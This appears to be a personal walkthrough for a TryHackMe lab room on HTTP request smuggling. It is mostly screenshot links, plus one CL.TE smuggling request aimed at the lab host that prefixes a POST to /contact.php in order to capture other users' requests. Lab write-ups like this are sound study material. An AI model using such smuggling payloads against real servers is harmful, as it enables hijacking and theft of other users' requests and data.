### 26-Jan-24-Fri

[TryHackMe | HTTP Request Smuggling](https://tryhackme.com/room/httprequestsmuggling)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/14d402ab-462c-446d-82b5-037e2b79ee79)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/4041a7e6-f4c3-4b25-9161-85ac41d3389b)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/c75b3dbe-2119-4f16-8a79-9c75bbf120e0)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/c6e94df0-ae7e-4368-b24b-59af2c827fa9)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/0c0a1d43-d480-44f9-9c3d-7cabe591e977)

```
POST / HTTP/1.1
Host: httprequestsmuggling.thm
Content-Type: application/x-www-form-urlencoded
Content-Length: 160
Transfer-Encoding: chunked

0

POST /contact.php HTTP/1.1
Host: httprequestsmuggling.thm
Content-Type: application/x-www-form-urlencoded
Content-Length: 500

username=test&query=§
```

![32964210f678d511e5a75b5e13a5c147](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/d834b01e-1391-4130-836c-e566d952c6a7)

![5e2511d719fc407762ad7551131fae40](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/bc211e3d-1a72-4b7c-936a-040282d96fd0)

![9dfb8dfb97e796d940b2bdc395012485](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/217f0bb6-0f28-41d9-bae6-8f896fc8e95b)

![60e31338ee743a34621d916cea98bff0](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/dd9deefb-2882-45c7-af08-9d17068aa3db)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/39cb213d-9fed-408f-98e2-9daf395afcba)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/ba81de68-da84-4d40-8118-bf7f293c84e6)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/866e0c21-8719-4b73-92e2-6df04efed424)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/bfc60b95-34e3-4fb2-ab3b-2d60b3353f9f)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/f4672789-646c-41ab-9bb0-f4d847b38600)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/7af5d54d-da2a-42b8-a8ba-7accd5ef02c4)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/b6d94f86-b030-4ea6-a527-46ef4179e97f)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/9b3b4667-2b2b-4a0b-ab34-f1f1ede990ed)
